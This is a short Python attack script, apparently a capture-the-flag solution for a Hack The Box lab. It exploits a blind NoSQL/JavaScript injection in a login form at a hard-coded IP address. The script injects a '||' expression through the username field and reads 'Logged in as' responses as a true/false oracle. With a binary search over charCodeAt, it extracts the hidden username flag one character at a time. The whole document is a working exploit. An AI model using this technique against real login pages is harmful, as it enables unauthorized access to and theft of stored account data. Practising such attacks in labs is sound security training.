#! /usr/bin/env python3

import requests
import json
import string
from urllib.parse import quote_plus

# Configuration
URL = "http://94.237.57.211:44708/index.php"
PROXY = {"http":"http://172.21.144.1:8081"}
HEADERS = {"Content-Type":"application/x-www-form-urlencoded"}
CHARSET = string.ascii_letters + string.digits + string.punctuation + " "

num_req = 0
def oracle(r):
    global num_req
    num_req += 1
    r = requests.post(URL, headers=HEADERS, proxies=PROXY, data="username=%s&password=test" % (quote_plus('" || (' + r + ') || ""=="')))
    return "Logged in as" in r.text

# assert (oracle('false') == False)
# assert (oracle('true') == True)

# Dump the username (binary search)
num_req = 0 # Reset the request counter
username = "HTB{" # Known beginning of username
i = 4 # Skip the first 4 characters (HTB{)
while username[-1] != "}": # Repeat until we meet '}' aka end of username
    low = 32 # Set low value of search area (' ')
    high = 127 # Set high value of search area ('~')
    mid = 0
    while low <= high:
        mid = (high + low) // 2 # Caluclate the midpoint of the search area
        if oracle('this.username.startsWith("HTB{") && this.username.charCodeAt(%d) > %d' % (i, mid)):
            low = mid + 1 # If ASCII value of username at index 'i' < midpoint, increase the lower boundary and repeat
        elif oracle('this.username.startsWith("HTB{") && this.username.charCodeAt(%d) < %d' % (i, mid)):
            high = mid - 1 # If ASCII value of username at index 'i' > midpoint, decrease the upper boundary and repeat
        else:
            username += chr(mid) # If ASCII value is neither higher or lower than the midpoint we found the target value
            break # Break out of the loop
    i += 1 # Increment the index counter (start work on the next character)
assert (oracle('this.username == `%s`' % username) == True)
print("---- Binary search ----")
print("Username: %s" % username)
print("Requests: %d" % num_req)